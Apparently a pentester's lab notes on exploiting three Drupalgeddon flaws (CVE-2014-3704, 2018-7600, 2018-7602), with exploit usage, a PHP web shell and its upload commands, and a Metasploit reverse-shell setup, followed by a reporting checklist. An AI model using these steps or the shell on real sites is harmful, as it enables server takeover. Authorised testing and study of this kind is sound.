## Drupal – Drupalgeddon Exploits
## 1. Drupalgeddon (CVE-2014-3704)

### Vulnerability

- Type: Pre-auth SQL injection in user login form    
- Affected: Drupal 7.0 – 7.31 (fixed in 7.32)
- Impact: Add admin user or inject RCE payload
### Exploit Script: `drupalgeddon.py`
#### Usage:

```bash
python2.7 drupalgeddon.py -t http://<target> -u hacker -p pwnd
```
#### Output:

```
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: hacker
[*] Pass: pwnd
```
#### Post-Exploitation:

- Login at `/user/login`    
- Confirm admin access at `/admin/people`
- Leverage admin to:
    - Enable PHP Filter
    - Upload backdoored module
    - Use existing shell mechanisms        
#### Alternative:

- Metasploit module:    

```
exploit/multi/http/drupal_drupageddon
```
## 2. Drupalgeddon2 (CVE-2018-7600)

### Vulnerability

- Type: Unauthenticated RCE via form input injection    
- Affected: Drupal < 7.58, < 8.5.1
- Impact: Upload arbitrary PHP script    
### PoC Script: `drupalgeddon2.py`
#### Confirm Vulnerability:

```bash
python3 drupalgeddon2.py
```

Input:

```
Target URL: http://<target>
```

Check uploaded file:

```bash
curl http://<target>/hello.txt
```
#### Upload Webshell (Manual Step):

```php
<?php system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); ?>
```

Convert to Base64:

```bash
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUW2Zl...
```

Decode and save:

```bash
echo "<base64>" | base64 -d | tee mrb3n.php
```

Modify PoC to upload `mrb3n.php`, then confirm execution:

```bash
curl http://<target>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```
#### Output:

```
uid=33(www-data) gid=33(www-data)
```
## 3. Drupalgeddon3 (CVE-2018-7602)
### Vulnerability

- Type: Authenticated RCE via Form API
- Affected: Drupal 7.x and 8.x    
- Requires: Valid session cookie + node deletion privilege
### Exploit: Metasploit
#### Prerequisites:

- Valid login → retrieve session cookie (e.g., via Burp)    
- Node ID (e.g., `1` from `/node/1`)
#### Configuration:

```bash
use exploit/multi/http/drupal_drupageddon3
set RHOSTS 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set DRUPAL_SESSION SESS<sessionid>=<value>
set DRUPAL_NODE 1
set LHOST 10.10.14.15
set LPORT 4444
```
#### Execute:

```bash
exploit
```
#### Output:

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: www-data (33)
```
## Summary: Drupalgeddon Vulnerabilities

| CVE           | Name          | Access          | Affected Versions | Exploit Type       |
| ------------- | ------------- | --------------- | ----------------- | ------------------ |
| CVE-2014-3704 | Drupalgeddon  | Unauthenticated | 7.0 – 7.31        | SQLi → Admin/RCE   |
| CVE-2018-7600 | Drupalgeddon2 | Unauthenticated | < 7.58, < 8.5.1   | RCE via form input |
| CVE-2018-7602 | Drupalgeddon3 | Authenticated   | Drupal 7.x, 8.x   | RCE via Form API   |
## Reporting Checklist

| Item            | Description                                                    |
| --------------- | -------------------------------------------------------------- |
| Created Users   | `hacker:pwnd` (CVE-2014-3704)                                  |
| Uploaded Shells | `mrb3n.php`, Base64-decode, path, timestamp                    |
| Artifacts       | `.php` files, modules, filters enabled                         |
| Cleanup         | Delete created admin, shell files, disable PHP Filter          |
| Session Details | If Drupalgeddon3 used, include session cookie and node ID used |
# Tags
> #Exploitation #Application-Exploitation #Drupal 